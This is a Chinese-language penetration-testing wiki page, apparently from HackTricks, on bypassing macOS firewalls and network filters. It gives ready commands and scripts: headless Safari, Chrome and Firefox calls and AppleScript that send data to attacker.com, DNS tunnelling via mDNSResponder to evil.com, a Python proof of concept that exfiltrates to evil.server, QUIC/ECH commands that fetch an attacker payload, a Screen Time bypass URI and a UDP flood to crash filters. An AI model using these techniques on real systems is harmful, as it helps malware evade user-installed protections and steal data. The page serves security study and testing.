# macOS 绕过防火墙

{{#include ../../banners/hacktricks-training.md}}

## 已发现的技术

以下技术已被发现在某些 macOS 防火墙应用中有效。

### 滥用白名单名称

- 例如，使用知名 macOS 进程的名称（如 **`launchd`**）来命名 malware

### Synthetic Click

- 如果防火墙向用户请求权限，让 malware **点击 allow**

### **使用 Apple 签名的二进制文件**

- 例如 **`curl`**，以及其他工具，如 **`whois`**

### 知名 Apple 域名

防火墙可能允许连接到知名 Apple 域名，例如 **`apple.com`** 或 **`icloud.com`**。也可以使用 iCloud 作为 C2。

### 通用绕过

一些可以尝试绕过防火墙的思路

### 检查允许的流量

了解允许的流量有助于识别可能已加入白名单的域名，或确定哪些应用程序可以访问这些域名
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### 滥用 DNS

在 macOS 上，进程**不会**自行与 DNS 服务器通信。名称解析通过 **XPC** 由 **`mDNSResponder`**（`/usr/sbin/mDNSResponder`）代理。它是由 Apple 签名的系统守护进程，因此机器上的每次查询都会以**来自 `mDNSResponder` 的流量**离开主机，而不是以发起查询的进程身份离开。防火墙因此往往会无条件信任该守护进程——拒绝它会导致整个系统的名称解析中断。<sup>[[1]](#references)</sup>

这使 DNS 成为一种即使防火墙阻止恶意软件自己的 socket，仍能保持开放的通道：<sup>[[1]](#references)</sup>

1. 恶意软件尝试连接 `evil.com`。它**自己的**出站连接会被防火墙检查并**阻止**。
2. 恶意软件转而通过 XPC 请求 `mDNSResponder` **解析** `evil.com`。
3. 防火墙检查生成的查询，发现发起者是受信任的 Apple 签名解析器，于是**允许该查询**。
4. 查询抵达 DNS 服务器——如果攻击者运行 `evil.com` 的权威服务器，他们就能控制通信的两端。

由于攻击者拥有该 zone，根本不需要建立“连接”：数据会被隐藏在**查询的 labels**中（例如 `<encoded-chunk>.evil.com`），命令则通过**响应记录**（TXT、A、CNAME……）返回。这就是经典的 DNS tunnelling，依托的是一个完全被 allowlist 的进程。

任何非特权进程都可以直接驱动该守护进程，这是确认该路径处于开放状态的简单方法：
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### 通过浏览器应用

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

如果你可以向**允许连接任意服务器的进程注入代码**，就可以绕过 firewall 防护：


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
2024 年 7 月，Apple 修复了 Safari/WebKit 中的一个严重漏洞，该漏洞会破坏 Screen Time 家长控制所使用的系统级“Web content filter”。

特殊构造的 URI（例如使用双重 URL 编码的“://”）不会被 Screen Time ACL 识别，但会被 WebKit 接受，因此请求会未经过滤地发出。任何能够打开 URL 的进程（包括 sandboxed 或 unsigned code）都可以访问用户或 MDM profile 明确屏蔽的域名。<sup>[[2]](#references)</sup>

未打补丁系统上的实际测试：
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### 早期 macOS 14 “Sonoma” 中的 Packet Filter (PF) 规则排序 bug
在 macOS 14 beta 周期期间，Apple 在 **`pfctl`** 外围的 userspace wrapper 中引入了一个回归问题。
使用 `quick` keyword 添加的规则（许多 VPN kill-switch 都会使用）会被静默忽略，即使 VPN/firewall GUI 显示为 *blocked*，也会导致 traffic leaks。多个 VPN vendor 确认了该 bug，并在 RC 2（build 23A344）中修复。

快速 leak-check：
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abuse Apple-signed helper services（legacy – pre-macOS 11.2）
在 macOS 11.2 之前，**`ContentFilterExclusionList`** 允许约 50 个 Apple binaries（例如 **`nsurlsessiond`** 和 App Store）绕过所有使用 Network Extension framework 实现的 socket-filter firewalls（LuLu、Little Snitch 等）。
Malware 只需启动一个被排除的 process，或向其中注入 code，即可通过已获允许的 socket 隧道传输自身的 traffic。Apple 已在 macOS 11.2 中完全移除该 exclusion list，但对于无法升级的 systems，该 technique 仍然具有参考价值。<sup>[[3]](#references)</sup>

Example proof-of-concept（pre-11.2）：
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### 使用 QUIC/ECH 规避 Network Extension 域名过滤器（macOS 12+）
NEFilter Packet/Data Providers 依据 TLS ClientHello 中的 SNI/ALPN 进行匹配。借助 **基于 QUIC 的 HTTP/3（UDP/443）** 和 **Encrypted Client Hello（ECH）**，SNI 始终处于加密状态，NetExt 无法解析该流量，主机名规则通常会 fail-open，从而使 malware 无需接触 DNS 即可访问被阻止的域名。<sup>[[5]](#references)</sup>

最小 PoC：
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
如果仍启用 QUIC/ECH，这是绕过 hostname-filter 的简单途径。

### macOS 15 “Sequoia” Network Extension 不稳定性（2024–2025）
早期的 15.0/15.1 构建版本会导致第三方 **Network Extension** filters（LuLu、Little Snitch、Defender、SentinelOne 等）崩溃。当 filter 重启时，macOS 会丢弃其 flow rules，许多产品会 fail-open。向 filter 发送数千个短 UDP flows（或强制使用 QUIC/ECH）可能反复触发崩溃，并在 GUI 仍声称 firewall 正在运行时，为 C2/exfil 留出窗口。<sup>[[4]](#references)</sup>

快速复现（安全的 lab box）：
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 现代 macOS 的工具使用技巧

1. 检查 GUI firewalls 生成的当前 PF 规则：
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 枚举已持有 *outgoing-network* entitlement 的 binaries（适用于 piggy-backing）：
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. 使用 Objective-C/Swift 以编程方式注册你自己的 Network Extension content filter。
Patrick Wardle 的 **LuLu** source code 中提供了一个将 packets 转发到本地 socket 的最小 rootless PoC。

## 参考资料

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice：Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
